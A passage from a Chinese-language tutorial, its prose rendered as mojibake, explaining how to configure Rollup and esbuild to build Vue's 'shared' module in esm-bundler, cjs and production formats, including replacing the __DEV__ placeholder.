<p>ç„¶è€Œé™¤äº† <code>cjs</code> æ ¼å¼çš„æ–‡ä»¶ï¼Œè¿˜è¦ä¸º <code>shared</code> æ¨¡å—æ„å»º <code>esm-bundler</code> æ ¼å¼çš„æ–‡ä»¶ï¼Œè¿™éœ€è¦å¾€ <code>packageConfigs</code> æ•°ç»„ä¸­ push å¤šä¸ªé…ç½®é¡¹ï¼Œæˆ‘ä»¬å¯ä»¥å°è£…ä¸€ä¸ª <code>createConfig</code> æ–¹æ³•æ¥åˆ›å»ºé…ç½®é¡¹ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/** rollup.config.js */</span>

<span class="hljs-comment">// ç•¥...</span>

<span class="hljs-keyword">const</span> outputConfigs = {
  <span class="hljs-string">'esm-bundler'</span>: {
    <span class="hljs-attr">file</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">'./packages/shared/dist/shared.esm-bundler.js'</span>),
    <span class="hljs-attr">format</span>: <span class="hljs-string">'es'</span>,
  },
  <span class="hljs-string">'cjs'</span>: {
    <span class="hljs-attr">file</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">'./packages/shared/dist/shared.cjs.js'</span>),
    <span class="hljs-attr">format</span>: <span class="hljs-string">'cjs'</span>,
  },
}

<span class="hljs-keyword">const</span> packageFormats = [<span class="hljs-string">'esm-bundler'</span>, <span class="hljs-string">'cjs'</span>]

<span class="hljs-keyword">const</span> packageConfigs = packageFormats.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">format</span> =&gt;</span> <span class="hljs-title function_">createConfig</span>(format, outputConfigs[format]))

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> packageConfigs

<span class="hljs-keyword">function</span> <span class="hljs-title function_">createConfig</span>(<span class="hljs-params">format, output, plugins = []</span>) {
	<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`æ­£åœ¨åˆ›å»º <span class="hljs-subst">${format}</span> æ ¼å¼çš„æ„å»ºé…ç½®...`</span>)

	<span class="hljs-keyword">return</span> {
		<span class="hljs-attr">input</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">'./packages/shared/src/index.ts'</span>),
		<span class="hljs-attr">plugins</span>: [   
			<span class="hljs-title function_">esbuild</span>({  
				<span class="hljs-attr">tsconfig</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">'tsconfig.json'</span>),
				<span class="hljs-attr">minify</span>: <span class="hljs-literal">false</span>,
				<span class="hljs-attr">target</span>: <span class="hljs-string">'es2016'</span>,
			}),
			...plugins    <span class="hljs-comment">// æ”¯æŒæ‰©å±•è‡ªå®šä¹‰æ’ä»¶</span>
		],
		output,
    <span class="hljs-attr">treeshake</span>: {
			<span class="hljs-attr">moduleSideEffects</span>: <span class="hljs-literal">false</span>,
		},
	}
}
</code></pre>
<p>æ­¤æ—¶æ‰§è¡Œ <code>rollup -c</code> å¯æ„å»ºå‡º <code>packages/shared/dist/shared.cjs.js</code> å’Œ <code>packages/shared/dist/shared.esm-bundler.js</code> æ–‡ä»¶ã€‚</p>
<h4 data-id="heading-17">åˆ©ç”¨ <code>NODE_ENV</code> å’Œ <code>PROD_ONLY</code> å‚æ•°æŒ‡å®šäº§å‡ºç‰©ç¯å¢ƒ</h4>
<p>æ ¹æ®<a href="#md-dist" title="#md-dist">ã€Œå¾…æ„å»ºçš„ dist æ–‡ä»¶å¤¹ã€</a>å°èŠ‚æ‰€ç½—åˆ—çš„æ„å»ºäº§ç‰©ï¼Œæˆ‘ä»¬è¿˜éœ€ä¸º <code>shared</code> æ¨¡å—æ„å»ºä¸€ä¸ª CommonJS æ ¼å¼çš„<strong>ç”Ÿäº§ç¯å¢ƒ</strong>äº§ç‰© <code>shared.cjs.prod.js</code>ã€‚</p>
<p>å¦å¤–ï¼ŒVue å±äºä¸€ä¸ªå¤šæ¨¡å—ã€å¤æ‚åº¦è¾ƒé«˜çš„é¡¹ç›®ï¼Œä¼šæœ‰ã€ŒæŒ‰éœ€æ„å»ºã€çš„éœ€æ±‚ï¼Œç”¨äºèŠ‚çœæ„å»ºçš„ç­‰å¾…æ—¶é—´ã€‚ä¾‹å¦‚å¼€å‘è€…ä¼šå¸Œæœ›é€šè¿‡æ‰§è¡Œä¸åŒçš„ Rollup çš„æŒ‡ä»¤æ¥æ»¡è¶³å¦‚ä¸‹ä¸‰ç§åœºæ™¯ï¼š</p>
<ul>
<li>æ„å»ºæ‰€æœ‰ç”Ÿäº§ç¯å¢ƒå’Œå¼€å‘ç¯å¢ƒçš„äº§ç‰©ï¼›</li>
<li>åªæ„å»ºç”Ÿäº§ç¯å¢ƒçš„äº§ç‰©ï¼›</li>
<li>åªæ„å»ºå¼€å‘ç¯å¢ƒçš„äº§ç‰©ã€‚</li>
</ul>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ Rollup æ‰§è¡ŒæŒ‡ä»¤ä¸­çš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fcn.rollupjs.org%2Fcommand-line-interface%2F%23environment-values" target="_blank" title="https://cn.rollupjs.org/command-line-interface/#environment-values" ref="nofollow noopener noreferrer"><code>environment</code> å‚æ•°</a>æ¥ä¼ å€¼å¤„ç†ï¼š</p>
<ul>
<li>æ‰§è¡Œ <code>rollup -c --environment NODE_ENV:production</code> æ—¶æ„å»ºå‡ºæ‰€æœ‰ç”Ÿäº§ç¯å¢ƒå’Œå¼€å‘ç¯å¢ƒçš„äº§ç‰©ï¼›</li>
<li>æ‰§è¡Œ <code>rollup -c --environment NODE_ENV:production,PROD_ONLY:true</code> æ—¶åªæ„å»ºç”Ÿäº§ç¯å¢ƒçš„äº§ç‰©ï¼›</li>
<li>æ‰§è¡Œ <code>rollup -c --environment NODE_ENV:development</code> æ—¶åªæ„å»ºå¼€å‘ç¯å¢ƒçš„äº§ç‰©ã€‚</li>
</ul>
<p>è¿™é‡Œæˆ‘ä»¬è‡ªå®šä¹‰äº†ä¸¤ä¸ªå‚æ•° <code>NODE_ENV</code> å’Œ <code>PROD_ONLY</code>ï¼Œåˆ†åˆ«ç”¨äºæŒ‡å®šã€Œæ„å»ºç›®æ ‡ç¯å¢ƒã€å’Œã€Œæ˜¯å¦åªæ„å»ºç”Ÿäº§ç¯å¢ƒçš„äº§ç‰©ã€ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ <code>rollup.config.js</code> ä¸­é€šè¿‡ <code>process.env</code> æ¥è¯»å–ä¼ å…¥çš„è‡ªå®šä¹‰å‚æ•°å€¼ï¼Œå¹¶åšç›¸åº”çš„é€»è¾‘å¤„ç†ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/** rollup.config.js */</span>

<span class="hljs-comment">// ç•¥...</span>
<span class="hljs-keyword">const</span> packageFormats = [<span class="hljs-string">'esm-bundler'</span>, <span class="hljs-string">'cjs'</span>]

<span class="hljs-comment">// é€šè¿‡ process.env è·å–ä¼ å…¥çš„ PROD_ONLY å‚æ•°</span>
<span class="hljs-keyword">const</span> packageConfigs = process.<span class="hljs-property">env</span>.<span class="hljs-property">PROD_ONLY</span> ? [] : packageFormats.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">format</span> =&gt;</span> <span class="hljs-title function_">createConfig</span>(format, outputConfigs[format]))

<span class="hljs-comment">// è‹¥éœ€è¦æ„å»ºç”Ÿäº§ç¯å¢ƒäº§ç‰©ï¼Œé’ˆå¯¹ cjs æ ¼å¼ï¼Œæ·»åŠ å…¶ç”Ÿäº§ç¯å¢ƒçš„é…ç½®é¡¹</span>
<span class="hljs-keyword">if</span> (process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">'production'</span>) {    <span class="hljs-comment">// é€šè¿‡ process.env è·å–ä¼ å…¥çš„ NODE_ENV å‚æ•°</span>
  packageFormats.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">format</span> =&gt;</span> {
    <span class="hljs-keyword">if</span> (format === <span class="hljs-string">'cjs'</span>) {
      packageConfigs.<span class="hljs-title function_">push</span>(<span class="hljs-title function_">createProductionConfig</span>(format))
    }
  })
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> packageConfigs

<span class="hljs-keyword">function</span> <span class="hljs-title function_">createConfig</span>(<span class="hljs-params">format, output, plugins = []</span>) {
	<span class="hljs-keyword">const</span> isProductionBuild = <span class="hljs-regexp">/\.prod\.js$/</span>.<span class="hljs-title function_">test</span>(output.<span class="hljs-property">file</span>)
	<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`æ­£åœ¨åˆ›å»º<span class="hljs-subst">${isProductionBuild ? <span class="hljs-string">'ç”Ÿäº§ç¯å¢ƒ'</span> : <span class="hljs-string">'å¼€å‘ç¯å¢ƒ'</span>}</span> <span class="hljs-subst">${format}</span> æ ¼å¼çš„æ„å»ºé…ç½®...`</span>)

	<span class="hljs-keyword">return</span> {
		<span class="hljs-comment">// ç•¥...</span>
	}
}

<span class="hljs-comment">// åˆ›å»ºç”Ÿäº§ç¯å¢ƒé…ç½®é¡¹</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">createProductionConfig</span>(<span class="hljs-params">format</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">createConfig</span>(format, {
    ...outputConfigs[format],
    <span class="hljs-attr">file</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">'./packages/shared/dist/shared.cjs.prod.js'</span>),  <span class="hljs-comment">// æ„å»º cjs.prod.js æ–‡ä»¶</span>
  })
}
</code></pre>
<p>æ­¤æ—¶æ‰§è¡Œ <code>rollup -c --environment NODE_ENV:production,PROD_ONLY:true</code>ï¼Œä¼šå•ç‹¬æ„å»ºå‡º <code>packages/shared/dist/shared.cjs.prod.js</code> æ–‡ä»¶ã€‚</p>
<h4 data-id="heading-18">å¼€å‘ç¯å¢ƒå ä½ç¬¦ <code>__DEV__</code> åŠå…¶æ›¿æ¢</h4>
<p>æŸ¥çœ‹å‰æ–‡æ‰€æ„å»ºå‡ºçš„ <code>shared.cjs.js</code> å’Œ <code>shared.cjs.prod.js</code> æ–‡ä»¶ï¼Œä¼šå‘ç°å®ƒä»¬çš„å†…å®¹æ˜¯å®Œå…¨ç›¸åŒçš„ï¼Œè¯»è€…å¯èƒ½ä¼šå› æ­¤æ„Ÿåˆ°å›°æƒ‘ã€‚</p>
<p>ä¸ºäº†ä¾¿äºåŒºåˆ†ä¸åŒç¯å¢ƒäº§ç‰©çš„å†…å®¹ï¼ˆè€Œä¸ä»…ä»…æ˜¯æ–‡ä»¶åä¸åŒï¼‰ï¼Œæˆ‘ä»¬ä¿®æ”¹ <code>packages/shared/src/general.ts</code> çš„ä»£ç ï¼ŒåŠ ä¸Šä¸€ä¸ªè‡ªå®šä¹‰çš„å¼€å‘ç¯å¢ƒå ä½ç¬¦ <code>__DEV__</code>ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">/** packages/shared/src/general.ts */</span>

<span class="hljs-comment">/** ç©ºå¯¹è±¡ */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-attr">EMPTY_OBJ</span>: { <span class="hljs-keyword">readonly</span> [<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">any</span> } = __DEV__
  ? <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">freeze</span>({})
  : {}

<span class="hljs-comment">/** ç©ºæ•°ç»„ */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-attr">EMPTY_ARR</span>: <span class="hljs-keyword">readonly</span> <span class="hljs-built_in">never</span>[] = __DEV__ ? <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">freeze</span>([]) : []
</code></pre>
<p>æ­¤ä¸¾ç›®çš„æ˜¯è®© Vue æ¡†æ¶ä½¿ç”¨è€…åœ¨å¼€å‘ç¯å¢ƒä¸­ï¼Œé€šè¿‡ <code>Object.freeze</code> æ¥é¿å…æ”¹åŠ¨åˆ° Vue æºç å†…ç½®çš„ç©ºå¯¹è±¡å’Œç©ºæ•°ç»„ä¸¤ä¸ªå¸¸é‡ï¼Œåœ¨ç”Ÿäº§ç¯å¢ƒæ—¶åˆ™æ”¹ä¸ºä½¿ç”¨æ€§èƒ½æœ€ä¼˜çš„ç©ºå¯¹è±¡å’Œç©ºæ•°ç»„å³å¯ã€‚</p>
<blockquote>
<p>IDE åœ¨æ­¤æ—¶ä¼šå¯¹ <code>__DEV__</code> è¿›è¡Œæ ‡çº¢ï¼Œæç¤ºã€Œæ‰¾ä¸åˆ°åç§°__DEV__ã€ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ <code>packages</code> ä¸‹åˆ›å»ºä¸€ä¸ª <code>global.d.ts</code> æ–‡ä»¶ï¼Œç”¨äºå£°æ˜è¿™äº›è‡ªå®šä¹‰çš„å˜é‡ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// Global compile-time constants</span>
<span class="hljs-keyword">declare</span> <span class="hljs-keyword">var</span> <span class="hljs-attr">__DEV__</span>: <span class="hljs-built_in">boolean</span>
</code></pre>
</blockquote>
<p>æ¥ç€æˆ‘ä»¬åœ¨ <code>rollup.config.js</code> ä¸­ï¼Œé€šè¿‡ <code>rollup-plugin-esbuild</code> æ’ä»¶çš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fesbuild.github.io%2Fapi%2F%23define" target="_blank" title="https://esbuild.github.io/api/#define" ref="nofollow noopener noreferrer"><code>define</code></a> å±æ€§ï¼Œå¯¹ <code>__DEV__</code> å ä½ç¬¦è¿›è¡Œæ›¿æ¢ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/** rollup.config.js */</span>

<span class="hljs-comment">// ç•¥...</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">createConfig</span>(<span class="hljs-params">format, output, plugins = []</span>) {
	<span class="hljs-keyword">const</span> isProductionBuild = <span class="hljs-regexp">/\.prod\.js$/</span>.<span class="hljs-title function_">test</span>(output.<span class="hljs-property">file</span>)
  <span class="hljs-keyword">const</span> isBundlerESMBuild = <span class="hljs-regexp">/esm-bundler/</span>.<span class="hljs-title function_">test</span>(format)      <span class="hljs-comment">// æ˜¯å¦ä¸º ESM Bundler æ ¼å¼çš„æ„å»º</span>
	<span class="hljs-comment">// ç•¥...</span>

	<span class="hljs-keyword">return</span> {
		<span class="hljs-attr">input</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">'./packages/shared/src/index.ts'</span>),
		<span class="hljs-attr">plugins</span>: [  
			...<span class="hljs-title function_">resolveReplace</span>(),
			<span class="hljs-title function_">esbuild</span>({  
				<span class="hljs-attr">tsconfig</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">'tsconfig.json'</span>),
				<span class="hljs-attr">minify</span>: <span class="hljs-literal">false</span>,
				<span class="hljs-attr">target</span>: <span class="hljs-string">'es2016'</span>,
				<span class="hljs-attr">define</span>: <span class="hljs-title function_">resolveDefine</span>(),    <span class="hljs-comment">// æ›¿æ¢è‡ªå®šä¹‰å ä½ç¬¦</span>
			}),
			...plugins
		],
		<span class="hljs-comment">// ç•¥...</span>
	}

  <span class="hljs-keyword">function</span> <span class="hljs-title function_">resolveDefine</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> replacements = {}

    <span class="hljs-keyword">if</span> (isBundlerESMBuild) {
      replacements.<span class="hljs-property">__DEV__</span> = <span class="hljs-string">`!!(process.env.NODE_ENV !== 'production')`</span>
    } <span class="hljs-keyword">else</span> {
      replacements.<span class="hljs-property">__DEV__</span> = <span class="hljs-title class_">String</span>(!isProductionBuild)
    }

    <span class="hljs-keyword">return</span> replacements
  }
}
</code></pre>
<p>ç•™æ„åœ¨æ–°å¢çš„ <code>resolveDefine</code> æ–¹æ³•ä¸­ï¼Œæ˜¯å¦å¤„äº ESM Bundler æ ¼å¼çš„æ„å»ºä¼šå½±å“å ä½ç¬¦ <code>__DEV__</code> çš„æ›¿æ¢å†…å®¹ï¼š</p>
<ul>
<li>ESM Bundler æ ¼å¼çš„æ„å»ºäº§ç‰©ä¼šæŠŠ <code>__DEV__</code> å ä½ç¬¦æ›¿æ¢ä¸º <code>!!(process.env.NODE_ENV !== 'production')</code>ï¼Œå› ä¸ºè¯¥äº§ç‰©æ˜¯ä¼šäº¤ç”±ä¸šåŠ¡ä¾§å»æ‰§è¡ŒäºŒæ¬¡æ„å»ºçš„ï¼Œç”±ä¸šåŠ¡ä¾§çš„æ„å»ºå·¥å…·å†è¿›ä¸€æ­¥å»æ›¿æ¢ <code>process.env.NODE_ENV</code> å³å¯ï¼›</li>
<li>é ESM Bundler æ ¼å¼çš„æ„å»ºäº§ç‰©å±äºã€Œæœ€ç»ˆè¿è¡Œæ—¶ä»£ç ã€ï¼Œä¸ä¼šç»å†äºŒæ¬¡æ„å»ºï¼Œå› æ­¤è¦æŠŠ <code>__DEV__</code> å ä½ç¬¦æ ¹æ®æ„å»ºç¯å¢ƒæ›¿æ¢ä¸ºæ˜ç¡®çš„ <code>true</code> æˆ– <code>false</code>ï¼Œesbuild æ’ä»¶ä¼šåœ¨æ„å»ºè¿‡ç¨‹é€šè¿‡ Tree-Shaking ç§»é™¤æœªå‘½ä¸­çš„é€»è¾‘åˆ†æ”¯ï¼Œç¡®ä¿äº§ç‰©ç®€æ´ä¸”å¯ä»¥ç›´æ¥è¿è¡Œã€‚</li>
</ul>
<p>ç„¶è€Œæ­¤æ—¶æ‰§è¡Œ <code>rollup -c --environment NODE_ENV:production</code> æŒ‡ä»¤ï¼Œä¼šå‡ºç°æŠ¥é”™ï¼š</p>
<pre><code class="hljs language-diff" lang="diff"><span class="hljs-deletion">- [!] (plugin esbuild) Error: Transform failed with 1 error:</span>
<span class="hljs-deletion">- error: Invalid define value (must be an entity name or JS literal): !!(process.env.NODE_ENV !== 'production')</span>
</code></pre>
<p>è¿™æ˜¯å› ä¸º esbuild çš„ <code>define</code> å¯¹æ›¿æ¢å†…å®¹å…·æœ‰ä¸¥æ ¼çš„è¦æ±‚ï¼Œå…¶ä»…ç”¨äºå°†å…¨å±€æ ‡è¯†ç¬¦æ›¿æ¢ä¸º<strong>é™æ€å¸¸é‡</strong>ï¼Œå®ƒè¦æ±‚æ›¿æ¢çš„å†…å®¹å¿…é¡»æ˜¯å¸ƒå°”å€¼ã€æ•°å­—ã€å­—ç¬¦ä¸²ï¼Œæˆ–è€…æ˜¯å¦ä¸€ä¸ªæ ‡è¯†ç¬¦ï¼Œä½†ä¸èƒ½æ˜¯ <code>!!(process.env.NODE_ENV !== 'production')</code> è¿™æ ·çš„è¡¨è¾¾å¼è¯­å¥ã€‚</p>
<blockquote>
<p>esbuild ä¼šè¯•å›¾æŠŠè‡ªå®šä¹‰çš„ Key æ›¿æ¢æˆä¸€ä¸ªåˆæ³•çš„ AST èŠ‚ç‚¹ï¼Œå½“è¦æ›¿æ¢çš„å€¼æ˜¯ä¸€ä¸ªå¤æ‚çš„è¡¨è¾¾å¼æ—¶ï¼Œesbuild è§£æå™¨æ— æ³•å°†å…¶ä½œä¸ºä¸€ä¸ªå•ä¸€çš„ã€Œå€¼ã€æˆ–ã€Œæ ‡è¯†ç¬¦ã€æ’å…¥åˆ° AST ä¸­ï¼Œå› æ­¤ä¼šç›´æ¥æŠ›å‡º <code>Invalid define value</code> é”™è¯¯æ¥é˜»æ­¢æ„å»ºã€‚</p>
</blockquote>
<p>é’ˆå¯¹æ­¤é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ ESM Bundler åœºæ™¯æ”¹ä¸ºä½¿ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Frollup%2Fplugins%2Ftree%2Fmaster%2Fpackages%2Freplace" target="_blank" title="https://github.com/rollup/plugins/tree/master/packages/replace" ref="nofollow noopener noreferrer"><code>@rollup/plugin-replace</code></a> æ’ä»¶æ¥è¿›è¡Œå ä½ç¬¦æ›¿æ¢ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/** rollup.config.js */</span>

<span class="hljs-keyword">import</span> replace <span class="hljs-keyword">from</span> <span class="hljs-string">'@rollup/plugin-replace'</span>
<span class="hljs-comment">// ç•¥...</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">createConfig</span>(<span class="hljs-params">format, output, plugins = []</span>) {
	<span class="hljs-comment">// ç•¥...</span>

	<span class="hljs-keyword">return</span> {
		<span class="hljs-attr">input</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">'./packages/shared/src/index.ts'</span>),
		<span class="hljs-attr">plugins</span>: [         
			...<span class="hljs-title function_">resolveReplace</span>(),     <span class="hljs-comment">// ä½¿ç”¨ @rollup/plugin-replace æ’ä»¶</span>
			<span class="hljs-title function_">esbuild</span>({
				<span class="hljs-attr">tsconfig</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">'tsconfig.json'</span>),
				<span class="hljs-attr">minify</span>: <span class="hljs-literal">false</span>,
				<span class="hljs-attr">target</span>: <span class="hljs-string">'es2016'</span>,
				<span class="hljs-attr">define</span>: <span class="hljs-title function_">resolveDefine</span>(),
			}),
			...plugins
		],
		<span class="hljs-comment">// ç•¥...</span>
	}

	<span class="hljs-keyword">function</span> <span class="hljs-title function_">resolveDefine</span>(<span class="hljs-params"/>) {
		<span class="hljs-keyword">const</span> replacements = {}

		<span class="hljs-keyword">if</span> (!isBundlerESMBuild) {
			replacements.<span class="hljs-property">__DEV__</span> = <span class="hljs-title class_">String</span>(!isProductionBuild)
		}

		<span class="hljs-keyword">return</span> replacements
	}

	<span class="hljs-keyword">function</span> <span class="hljs-title function_">resolveReplace</span>(<span class="hljs-params"/>) {
		<span class="hljs-keyword">const</span> replacements = {}

    <span class="hljs-comment">// ESM Bundler æ ¼å¼çš„æ„å»ºäº§ç‰©ä½¿ç”¨ @rollup/plugin-replace æ¥æ›¿æ¢å ä½ç¬¦</span>
		<span class="hljs-keyword">if</span> (isBundlerESMBuild) {
			<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(replacements, {
				<span class="hljs-attr">__DEV__</span>: <span class="hljs-string">`!!(process.env.NODE_ENV !== 'production')`</span>,
			})
		}

		<span class="hljs-keyword">return</span> [<span class="hljs-title function_">replace</span>({ 
      <span class="hljs-attr">values</span>: replacements, 
      <span class="hljs-attr">preventAssignment</span>: <span class="hljs-literal">true</span>  <span class="hljs-comment">// è‹¥å˜é‡å‡ºç°åœ¨èµ‹å€¼å·ï¼ˆ = ï¼‰çš„å·¦è¾¹ï¼Œå°±ä¸è¦è¿›è¡Œæ›¿æ¢ã€‚ç›®çš„æ˜¯é˜²æ­¢æŠŠèµ‹å€¼è¯­å¥å½“æˆå¸¸é‡æ›¿æ¢ï¼ˆä¾‹å¦‚ __DEV__ = trueï¼‰</span>
    })]
	}
}
</code></pre>
<p>æ­¤æ—¶æ‰§è¡Œ <code>rollup -c --environment NODE_ENV:production</code> æŒ‡ä»¤ï¼Œæ„å»ºå‡ºçš„æ‰€æœ‰ <code>shared</code> æ¨¡å—äº§ç‰©å†…å®¹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/** packages/shared/dist/shared.cjs.js */</span>
<span class="hljs-meta">
'use strict'</span>;

<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">EMPTY_OBJ</span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">freeze</span>({}) ;
<span class="hljs-comment">// ç•¥...</span>
<span class="hljs-built_in">exports</span>.<span class="hljs-property">EMPTY_OBJ</span> = <span class="hljs-variable constant_">EMPTY_OBJ</span>;
<span class="hljs-comment">// ç•¥...</span>
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/** packages/shared/dist/shared.cjs.prod.js */</span>
<span class="hljs-meta">
'use strict'</span>;

<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">EMPTY_OBJ</span> = {};
<span class="hljs-comment">// ç•¥...</span>
<span class="hljs-built_in">exports</span>.<span class="hljs-property">EMPTY_OBJ</span> = <span class="hljs-variable constant_">EMPTY_OBJ</span>;
<span class="hljs-comment">// ç•¥...</span>
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/** packages/shared/dist/shared.esm-bundler.js */</span>

<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">EMPTY_OBJ</span> = !!(process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> !== <span class="hljs-string">"production"</span>) ? <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">freeze</span>({}) : {};
<span class="hljs-comment">// ç•¥...</span>

<span class="hljs-keyword">export</span> { 
  <span class="hljs-variable constant_">EMPTY_OBJ</span>, 
  <span class="hljs-comment">// ç•¥... </span>
}
</code></pre>
<blockquote>
<p>æˆ‘ä»¬ä¼šåœ¨ä¸‹ç¯‡æ–‡ç« ä¸ºæ„å»ºç³»ç»Ÿè¡¥å…… <code>reactivity</code> ç­‰å…¶å®ƒæ¨¡å—çš„æ„å»ºèƒ½åŠ›ã€‚</p>
</blockquote>
<h3 data-id="heading-19">3.3 <code>shared</code> æ¨¡å—çš„å¼€å‘æ„å»ºæ–¹æ¡ˆå®ç°</h3>
<p>æˆ‘ä»¬å·²ç»åœ¨å‰æ–‡äº†è§£è¿‡ï¼ŒVue æºç é¡¹ç›®åªé€šè¿‡ esbuild æ¥è´Ÿè´£å¼€å‘è°ƒè¯•æ—¶çš„æ„å»ºï¼Œæˆ‘ä»¬åœ¨ Vue æºç é¡¹ç›®çš„æ ¹ç›®å½•åˆ›å»º <code>./scripts/dev.js</code> æ–‡ä»¶æ¥é…ç½® esbuildï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> esbuild <span class="hljs-keyword">from</span> <span class="hljs-string">'esbuild'</span>
<span class="hljs-keyword">import</span> { dirname, relative, resolve } <span class="hljs-keyword">from</span> <span class="hljs-string">'node:path'</span>
<span class="hljs-keyword">import</span> { fileURLToPath } <span class="hljs-keyword">from</span> <span class="hljs-string">'url'</span>
<span class="hljs-keyword">import</span> { parseArgs } <span class="hljs-keyword">from</span> <span class="hljs-string">'util'</span>

<span class="hljs-keyword">const</span> __dirname = <span class="hljs-title function_">dirname</span>(<span class="hljs-title function_">fileURLToPath</span>(<span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">url</span>))

<span class="hljs-keyword">const</span> {
    <span class="hljs-attr">values</span>: { <span class="hljs-attr">format</span>: rawFormat, prod, },
} = <span class="hljs-title function_">parseArgs</span>({
    <span class="hljs-attr">options</span>: {
        <span class="hljs-attr">format</span>: {
            <span class="hljs-attr">type</span>: <span class="hljs-string">'string'</span>,
            <span class="hljs-attr">short</span>: <span class="hljs-string">'f'</span>,
            <span class="hljs-attr">default</span>: <span class="hljs-string">'cjs'</span>,
        },
        <span class="hljs-attr">prod</span>: {
            <span class="hljs-attr">type</span>: <span class="hljs-string">'boolean'</span>,
            <span class="hljs-attr">short</span>: <span class="hljs-string">'p'</span>,
            <span class="hljs-attr">default</span>: <span class="hljs-literal">false</span>,
        },
    },
})

<span class="hljs-keyword">const</span> format = rawFormat || <span class="hljs-string">'cjs'</span>
<span class="hljs-keyword">const</span> outputFormat = format === <span class="hljs-string">'cjs'</span> ? <span class="hljs-string">'cjs'</span> : <span class="hljs-string">'esm'</span>

<span class="hljs-keyword">const</span> pkgBasePath = <span class="hljs-string">`../packages/shared`</span>
<span class="hljs-keyword">const</span> outfile = <span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">`<span class="hljs-subst">${pkgBasePath}</span>/dist/shared.<span class="hljs-subst">${format}</span>.<span class="hljs-subst">${prod ? <span class="hljs-string">`prod.`</span> : <span class="hljs-string">``</span>}</span>js`</span>)

<span class="hljs-keyword">const</span> relativeOutfile = <span class="hljs-title function_">relative</span>(process.<span class="hljs-title function_">cwd</span>(), outfile)


<span class="hljs-comment">/** <span class="hljs-doctag">@type</span> {<span class="hljs-type">Array&lt;import('esbuild').Plugin&gt;</span>} */</span>
<span class="hljs-keyword">const</span> plugins = [
    {
        <span class="hljs-attr">name</span>: <span class="hljs-string">'log-rebuild'</span>,    <span class="hljs-comment">// åœ¨æ„å»ºå®Œæˆæ—¶ï¼Œæ‰“å°æ„å»ºå®Œæˆçš„æ–‡ä»¶è·¯å¾„</span>
        <span class="hljs-title function_">setup</span>(<span class="hljs-params">build</span>) {
            build.<span class="hljs-title function_">onEnd</span>(<span class="hljs-function">() =&gt;</span> {
                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`built: <span class="hljs-subst">${relativeOutfile}</span>`</span>)
            })
        },
    },
]

<span class="hljs-keyword">const</span> entry = <span class="hljs-string">'index.ts'</span>

esbuild
    .<span class="hljs-title function_">context</span>({
        <span class="hljs-attr">entryPoints</span>: [<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">`<span class="hljs-subst">${pkgBasePath}</span>/src/<span class="hljs-subst">${entry}</span>`</span>)],
        outfile,
        <span class="hljs-attr">bundle</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-attr">sourcemap</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-attr">format</span>: outputFormat,
